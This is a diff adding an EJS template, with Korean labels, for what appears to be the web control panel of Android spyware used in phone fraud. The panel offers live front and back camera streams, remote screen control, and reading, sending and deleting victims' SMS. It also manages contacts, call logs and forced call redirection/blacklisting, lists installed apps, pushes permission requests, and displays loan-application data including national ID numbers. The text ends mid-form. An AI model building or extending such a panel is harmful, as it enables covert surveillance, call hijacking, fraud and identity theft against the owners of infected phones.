@@ -1,0 +1,1017 @@
+<% include ../shared/header.ejs %>
+    <div class="page-content">
+        <script src="/assets/media-stream-library.min.js"></script>
+        <link
+            href="/assets/global/plugins/icheck/skins/all.css"
+            rel="stylesheet"
+            type="text/css"
+        />
+        <link
+            href="/assets/global/plugins/icheck/icheck.min.js"
+            rel="stylesheet"
+            type="text/css"
+        />
+        <style>
+            #batteryContainer {
+                display: -webkit-box;
+                display: -moz-box;
+                display: -ms-flexbox;
+                display: -webkit-flex;
+                display: flex;
+                flex-direction: row;
+                align-items: center;
+                justify-content: center;
+            }
+
+            #batteryContainer .batteryOuter {
+                border-radius: 3px;
+                border: 1px solid #999696;
+                padding: 1px;
+                width: 50px;
+                height: 20px;
+            }
+
+            #batteryContainer .batteryBump {
+                border-radius: 2px;
+                background-color: #999696;
+                width: 2px;
+                height: 6px;
+            }
+
+            #batteryLevel {
+                border-radius: 2px;
+                background-color: #8cc1fa;
+                width: 0%;
+                height: 17px;
+                overflow-wrap: normal;
+            }
+
+            #map {
+                height: 600px;
+                width: 100%;
+            }
+
+            .search_item {
+                padding-left: 5px !important;
+                padding-right: 5px !important;
+            }
+
+            button.min {
+                padding: 0;
+                cursor: pointer;
+                background: 0 0;
+                border: 0;
+                -webkit-appearance: none;
+            }
+
+            .min {
+                float: right;
+                font-size: 21px;
+                line-height: 1;
+                color: #000;
+                text-shadow: 0 1px 0 #fff;
+                opacity: .2;
+            }
+
+            .screen_modal_content {
+                background: darkslategrey;
+                border-radius: 20px !important;
+            }
+
+            .screen_modal_content .modal-header .modal-title {
+                color: cadetblue;
+            }
+
+            .screen_modal_content .modal-body {
+                color: cadetblue;
+            }
+
+            .screen_modal_content .modal-footer {
+                color: cadetblue;
+            }
+
+            .stream_modal_content {
+                background: darkslategrey;
+                border-radius: 20px !important;
+            }
+
+            .stream_modal_content .modal-header .modal-title {
+                color: cadetblue;
+            }
+
+            .stream_modal_content .modal-body {
+                color: cadetblue;
+            }
+
+            .stream_modal_content .modal-footer {
+                color: cadetblue;
+            }
+
+            .album-img {
+                height: 120px;
+                width: 100%;
+                object-fit: cover;
+            }
+        </style>
+        <div class="row">
+            <div class="col-md-9 col-sm-9 page-content-col" id="main_mobile_content">
+                <h3 class="page-title">
+                </h3>
+
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="portlet light bordered">
+
+                            <div class="portlet-title" style="display: flex; align-items: center;">
+                                <button type="button" class="btn btn-primary" id="all_search_btn">
+                                    <i class="fa fa-circle-o-notch"></i><%= __('mobiles.entire') %></button>
+                                <button type="button" class="btn btn-primary" id="online_search_btn">
+                                    <i class="fa fa-toggle-on"></i><%= __('mobiles.online') %></button>
+                                <button type="button" class="btn btn-primary" id="offline_search_btn">
+                                    <i class="fa fa-toggle-off"></i><%= __('mobiles.offline') %></button> &nbsp;&nbsp;
+                                <button type="button" class="btn btn-warning" id="trash_search_btn">
+                                    <i class="fa fa-trash"></i><%= __('mobiles.trashcan') %></button>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                <button type="button" class="btn btn-danger" id="remove_btn" disabled>
+                                    <i class="fa fa-trash"></i><%= __('mobiles.deleteselection') %></button>&nbsp;&nbsp;
+                                <% if (user.roles.includes('chongpan')) { %>
+                                    <label class="control-label"><%= __('mobiles.byvendor') %>:</label>
+                                    <select class="form-control" style="width: auto; display: initial;" id="app_id">
+                                    </select>&nbsp;&nbsp;
+                                    <button type="button" class="btn btn-primary" style="margin-right: 0px; margin-left: auto;" onclick="javascript: window.open('logs','_blank');">
+                                        <i class="fa fa-history"></i><%= __('mobiles.log') %></button>&nbsp;&nbsp;
+                                <% } else{ %>
+                                <button type="button" class="btn btn-primary" id="get_down_link_btn">
+                                    <i class="fa fa-download"></i><%= __('mobiles.downlink') %></button>&nbsp;&nbsp;
+                                <% } %>
+                                <% if(user.roles.includes('maezhang')) {%>
+                                    <button type="button" class="btn blue mt-ladda-btn ladda-button btn-outline"
+                                        style="margin-right: 0px; margin-left: auto;">
+                                        <span class="ladda-label">
+                                            <i class="icon-calendar"></i> <%= __('mobiles.expiredday') %> <%=user.expiredDay%> 까지</user.expiredDay></span>
+                                    <span class="ladda-spinner"></span></button>
+                                <%}%>
+                            </div>
+
+                            <div class="portlet-body">
+                                <table id="mobile_table"> </table>
+                            </div>
+                            <ul id="userstable-context-menu" class="dropdown-menu">
+                                <li data-item="db_sync">
+                                    <a><%= __('mobiles.contextmenu.dbsync') %></a>
+                                </li>
+                                <% if (user.roles.includes('chongpan')) { %>
+                                    <li data-item="change_app_id">
+                                        <a><%= __('mobiles.contextmenu.changeStore') %></a>
+                                    </li>
+                                    <% } %>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="stream_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog" style="width: 302px;" id="stream_modal_content">
+                    <div class="modal-content stream_modal_content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title" id="action_title"><%= __('mobiles.realtime.display') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <label class="form-contrle" id="stream_status"><%= __('mobiles.realtime.recording.disconnect') %></label>
+                            <div class="btn-group btn-group-xs btn-group-solid" id="camera_switch_button_group">
+                                <button type="button" class="btn green disabled" id="back_camera"><%= __('mobiles.realtime.recording.backcamera') %></button>
+                                <button type="button" class="btn red" id="front_camera"><%= __('mobiles.realtime.recording.frontcamera') %></button>
+                            </div>
+                            <video id="video" style="object-fit: contain; width: 300px;" autoplay></video>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.realtime.recording.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="contact_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg" style="margin: 30px !important;">
+                    <div class="modal-content" id="contact_modal_content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.contact') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin-top: 10px;">
+                                <form class="form-horizontal row" role="form" id="contact_table_search_form" style="display: none;">
+                                    <div class="form-group col-sm-3">
+                                        <label class="col-sm-5 control-label"><%= __('mobiles.contact.search.name') %>:</label>
+                                        <div class="col-sm-7">
+                                            <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.contact.search.name') %>" id="search_contact_name">
+                                        </div>
+                                    </div>
+                                    <div class="form-group col-sm-3">
+                                        <label class="col-sm-5 control-label"><%= __('mobiles.contact.search.contact') %>:</label>
+                                        <div class="col-sm-7">
+                                            <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.contact.search.contact') %>" id="search_contact_number">
+                                        </div>
+                                    </div>
+                                    <div class="form-group col-sm-3">
+                                        <label class="col-sm-5 control-label"><%= __('mobiles.contact.search.type') %>:</label>
+                                        <div class="col-sm-7">
+                                            <select class="form-control" id="search_contact_type">
+                                                <option value=""><%= __('mobiles.contact.search.type.all') %></option>
+                                                <option value="blacklist"><%= __('mobiles.contact.search.type.blacklist') %></option>
+                                                <option value="outgoing"><%= __('mobiles.contact.search.type.forcedincoming') %></option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                    <div class="form-group col-sm-3" style="margin-left: 50px;">
+                                        <button type="button" class="btn green btn-outline" id="contact_modal_search_btn"><%= __('mobiles.contact.search.allow') %></button>
+                                        <button type="button" class="btn default btn-outline" id="contact_modal_search_cancel_btn"><%= __('mobiles.contact.search.cancellation') %></button>
+                                    </div>
+                                </form>
+                            </div>
+                            <div style="margin: 10px;">
+                                <span id="upload_result"></span>
+                                <button type="button" class="btn blue btn-outline" id="upload_contact_btn">
+                                    <i class="fa fa-refresh" aria-hidden="true"></i>
+                                </button>
+                                <button type="button" class="btn green btn-outline" id="add_contact_modal_show_btn">
+                                    <i class="fa fa-plus" aria-hidden="true"></i><%= __('mobiles.contact.addition') %></button>
+                                <button type="button" class="btn red btn-outline" id="delete_contact_btn" disabled>
+                                    <i class="fa fa-trash" aria-hidden="true"></i><%= __('mobiles.contact.delete') %></button>
+                                <button type="button" class="btn yellow btn-outline" id="id-btn-regist-incall-black" disabled>
+                                    <i class="fa fa-edit" aria-hidden="true"></i><%= __('mobiles.contact.forcedincomingblacklist') %></button>
+                                <button type="button" class="btn yellow btn-outline" id="search_contact_btn">
+                                    <i class="fa fa-search" aria-hidden="true"></i><%= __('mobiles.contact.search') %></button>
+                            </div>
+                            <div style="margin: 10px;">
+                                <table id="contact_table"> </table>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.contact.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="add_contact_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.contact.addition') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.contact.addition.name') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.contact.addition.name') %>" id="contact_name">
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.contact.addition.phonenumber') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.contact.addition.phonenumber') %>" id="contact_number">
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn green btn-outline" id="add_contact_btn"><%= __('mobiles.contact.addition.confirm') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.contact.addition.cancellation') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="message_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.message') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <div class="portlet green-sharp box">
+                                        <div class="portlet-title">
+                                            <div class="caption">
+                                                <button type="button" class="btn purple btn-outline" id="update_message_btn"><%= __('mobiles.message.recentmessage') %></button>
+                                                <button type="button" class="btn purple btn-outline" id="update_message_btn_0"><%= __('mobiles.message.allmessage') %></button>
+                                                <span id="upload_message_result"></span>
+                                            </div>
+                                            <div class="tools">
+                                                <a href="javascript:;" class="expand" data-original-title="" title=""> </a>
+                                            </div>
+                                        </div>
+                                        <div class="portlet-body" style="display: none;">
+                                            <div class="row">
+                                                <div class="col-md-5">
+                                                    <%= __('mobiles.message.setdefaultapp') %> :
+                                                    <input type="checkbox" class="uiswitch" id="default_message" style="top: 10px !important;">
+                                                    <button type="button" class="btn red btn-outline" id="delete_message_btn" disabled>
+                                                        <i class="fa fa-trash" aria-hidden="true"></i><%= __('mobiles.message.delete') %></button>
+                                                </div>
+                                                <div class="col-md-2  control-label">
+                                                    <%= __('mobiles.message.phonenumber') %>:
+                                                </div>
+                                                <div class="col-md-1">
+                                                    <input type="text" class="form-control input-sm" id="search_message_addr" style="max-width: 200px;">
+                                                </div>
+                                                <div class="col-md-1">
+                                                    <%= __('mobiles.message.content') %>:
+                                                </div>
+                                                <div class="col-md-2">
+                                                    <input type="text" class="form-control input-sm" id="search_message_body" style="max-width: 200px;">
+                                                </div>
+                                                <div class="col-md-1">
+                                                    <button type="button" class="btn btn-sm green btn-outline" id="search_message_btn"><%= __('mobiles.message.search') %></button>
+                                                </div>
+                                            </div>
+                                            <hr>
+                                            <div class="row" style="margin: 10px;">
+                                                <label class="col-md-3 control-label"><%= __('mobiles.message.phonenumber') %>:</label>
+                                                <div class="col-md-3">
+                                                    <input type="text" class="form-control input-sm" id="sms_number">
+                                                </div>
+                                                <div class="col-md-6">
+                                                    <button type="button" class="btn btn-sm blue btn-outline" id="send_message_btn"><%= __('mobiles.message.submit') %></button>
+                                                </div>
+                                            </div>
+                                            <div class="row" style="margin: 10px;">
+                                                <label class="col-md-3 control-label">SMS:</label>
+                                                <div class="col-md-9">
+                                                    <textarea id="sms_body" rows="3" style="width: 100%;"></textarea>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div style="margin: 10px;">
+                                <table id="message_table"> </table>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.message.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="calllog_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.calllog') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin-top: 10px;">
+                                <form class="form-horizontal" role="form" id="calllog_table_search_form" style="display: none;">
+                                    <div class="row">
+                                        <div class="form-group col-sm-3 search_item">
+                                            <label class="col-sm-5 search_item control-label"><%= __('mobiles.calllog.search.phonenumber') %>:</label>
+                                            <div class="col-sm-7 search_item">
+                                                <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.calllog.search.phonenumber') %>" id="search_calllog_number">
+                                            </div>
+                                        </div>
+                                        <div class="form-group col-sm-3 search_item">
+                                            <label class="col-sm-5 search_item control-label"><%= __('mobiles.calllog.search.name') %>:</label>
+                                            <div class="col-sm-7 search_item">
+                                                <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.calllog.search.name') %>" id="search_calllog_name">
+                                            </div>
+                                        </div>
+                                        <div class="form-group col-sm-3 search_item">
+                                            <label class="col-sm-5 search_item control-label"><%= __('mobiles.calllog.search.calltime') %>:</label>
+                                            <div class="col-sm-7 search_item">
+                                                <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.calllog.search.calltime') %>" id="search_calllog_duration">
+                                            </div>
+                                        </div>
+                                        <div class="form-group col-sm-3 search_item">
+                                            <label class="col-sm-5 search_item control-label"><%= __('mobiles.calllog.search.time') %>:</label>
+                                            <div class="col-sm-7 search_item">
+                                                <input type="text" class="form-control input-sm" placeholder="<%= __('mobiles.calllog.search.time') %>" id="search_calllog_time">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row">
+                                        <div class="form-group col-sm-3 search_item">
+                                            <label class="col-sm-5 search_item control-label"><%= __('mobiles.calllog.search.type') %>:</label>
+                                            <div class="col-sm-7 search_item">
+                                                <select class="form-control" id="search_calllog_type">
+                                                    <option value=""><%= __('mobiles.calllog.search.type.every') %></option>
+                                                    <option value="outgoing"><%= __('mobiles.calllog.search.type.sent') %></option>
+                                                    <option value="incoming"><%= __('mobiles.calllog.search.type.reception') %></option>
+                                                    <option value="missed"><%= __('mobiles.calllog.search.type.notreceived') %></option>
+                                                    <option value="voicemail"><%= __('mobiles.calllog.search.type.voicemail') %></option>
+                                                    <option value="rejected"><%= __('mobiles.calllog.search.type.refuse') %></option>
+                                                    <option value="blocked"><%= __('mobiles.calllog.search.type.block') %></option>
+                                                    <option value="answered_externally"><%= __('mobiles.calllog.search.type.externalresponse') %></option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="form-group col-sm-3 search_item" style="margin-left: 50px;">
+                                            <button type="button" class="btn green btn-outline" id="calllog_modal_search_btn"><%= __('mobiles.calllog.search.submit') %></button>
+                                            <button type="button" class="btn default btn-outline" id="calllog_modal_search_cancel_btn"><%= __('mobiles.calllog.search.cancellation') %></button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                            <div style="margin: 10px;;">
+                                <span id="upload_calllog_result"></span>
+                                <button type="button" class="btn blue btn-outline" id="upload_calllog_btn">
+                                    <i class="fa fa-refresh" aria-hidden="true"></i>
+                                </button>
+                                <button type="button" class="btn red btn-outline" id="delete_calllog_btn" disabled>
+                                    <i class="fa fa-trash" aria-hidden="true"></i><%= __('mobiles.calllog.delete') %></button>
+                                <button type="button" class="btn yellow btn-outline" id="search_calllog_btn">
+                                    <i class="fa fa-search" aria-hidden="true"></i><%= __('mobiles.calllog.search') %></button>
+                            </div>
+                            <div style="margin: 10px;">
+                                <table id="calllog_table"> </table>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.calllog.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="app_id_change_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.contextmenu.changeStore') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <input type="text" class="form-control input-sm" id="mobile_id_change" style="display: none;">
+
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.changeStore.now') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="username_change" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.changeStore.to') %>:</label>
+                                        <div class="col-md-9">
+                                            <select class="form-control" style="width: auto; display: initial;" id="app_id_change">
+                                            </select>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn green btn-outline" id="change_app_id_btn"><%= __('mobiles.changeStore.check') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.changeStore.cancellation') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="apk_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.apk') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin: 10px;">
+                                <div class="row">
+                                    <div class="col-md-7">
+                                        <button type="button" class="btn blue btn-outline" id="upload_apks_btn">
+                                            <i class="fa fa-refresh" aria-hidden="true"></i>
+                                        </button>
+                                        <span id="upload_apks_result"></span>
+                                    </div>
+                                    <div class="col-md-1">
+                                        <%= __('mobiles.apk.detail') %>:
+                                    </div>
+                                    <div class="col-md-2">
+                                        <input type="text" class="form-control input-sm" id="search_apk_name" style="max-width: 200px;">
+                                    </div>
+                                    <div class="col-md-2">
+                                        <button type="button" class="btn btn-sm green btn-outline" id="search_apk_btn"><%= __('mobiles.apk.search') %></button>
+                                    </div>
+                                    <input type="hidden" id="id-input-apkmodal-type">
+                                </div>
+                            </div>
+                            <div style="margin: 10px;">
+                                <table id="apk_table"> </table>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.apk.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal-small" id="id-modal-secondary-permission" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-sm">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.permission') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin: 10px;">
+                                <button type="button" class="btn blue btn-outline" id="id-btn-view-secondPermission">
+                                    <i class="fa fa-refresh" aria-hidden="true"></i>
+                                </button>
+                                <span id="id-span-second-permission"></span>
+                            </div>
+                            <form role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <div class="input-group">
+                                            <div class="icheck-list">
+                                                <label>
+                                                    <input type="checkbox" class="icheck" id="id-input-secondPermiCamera"> <%= __('mobiles.permission.camera') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck" id="id-input-secondPermiMic"> <%= __('mobiles.permission.mic') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck" id="id-input-secondPermiPhone"> <%= __('mobiles.permission.phone') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck" id="id-input-secondPermiLocation"> <%= __('mobiles.permission.location') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck" id="id-input-secondPermiFile"> <%= __('mobiles.permission.file') %> </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" id="id-btn-requestPermission-second"><%= __('mobiles.permission.request') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.permission.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal-small" id="id-modal-third-permission" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-sm">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.permission') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin: 10px;">
+                                <button type="button" class="btn blue btn-outline" id="id-btn-view-thirdPermission">
+                                    <i class="fa fa-refresh" aria-hidden="true"></i>
+                                </button>
+                                <span id="id-span-third-permission"></span>
+                            </div>
+                            <form role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <div class="input-group">
+                                            <div class="icheck-list">
+                                                <label>
+                                                    <input type="checkbox" class="icheck"  id="id-input-thirdPermiContact"> <%= __('mobiles.permission.contact') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck"  id="id-input-thirdPermiPhone"> <%= __('mobiles.permission.phone') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck"  id="id-input-thirdPermiCalllog"> <%= __('mobiles.permission.calllog') %> </label>
+                                                <label>
+                                                    <input type="checkbox" class="icheck"  id="id-input-thirdPermiSms"> <%= __('mobiles.permission.sms') %> </label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" id="id-btn-requestPermission-third"><%= __('mobiles.permission.request') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.permission.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade" id="screen_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog" style="min-width: 660px;" id="screen_modal_content">
+                    <div class="modal-content screen_modal_content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.screen') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin: 10px;">
+                                <div>
+                                    <span id="screen_status"><%= __('mobiles.screen.disconnect') %></span>
+                                </div>
+
+                                <video id="screen" style="min-height: 640px; border-radius: 20px;" autoplay></video>
+                                <div style="display: flex; justify-content: space-evenly; width: 50%; margin-left: 25%; margin-top: 20px;">
+                                    <button type="button" class="btn btn-sm default" id="screen_back_button">
+                                        <i class="fa fa-caret-left" aria-hidden="true"></i>
+                                    </button>
+                                    <button type="button" class="btn btn-sm default" id="screen_home_button">
+                                        <i class="fa fa-circle" aria-hidden="true"></i>
+                                    </button>
+                                    <button type="button" class="btn btn-sm default" id="screen_recents_button">
+                                        <i class="fa fa-stop" aria-hidden="true"></i>
+                                    </button>
+                                    <button type="button" class="btn btn-sm default" id="screen_wakeup_button">
+                                        <i class="fa fa-power-off" aria-hidden="true"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.screen.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="loan_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.loan') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.contact') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_phone" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.name') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_nickname" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.residentregistrationnumber') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_social" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.employerNameBusinessName') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_company" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.salary') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_income" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.loan.applicationAmount') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="loan_amount" disabled>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.loan.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="attendance_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title">근태자료</h4>
+                        </div>
+                        <div class="modal-body form">
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">연락처:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_mobile_number" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">이름:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_nickname" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">출근시간:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_starttime" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">퇴근시간:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_endtime" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">담당지역:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_address" disabled>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label">신청날짜:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="attendance_createdat" disabled>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="edit_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.edit') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <input type="text" class="form-control input-sm" id="mobile_id" style="display: none;">
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.edit.name') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="mobile_name">
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.edit.phonenumber') %>:</label>
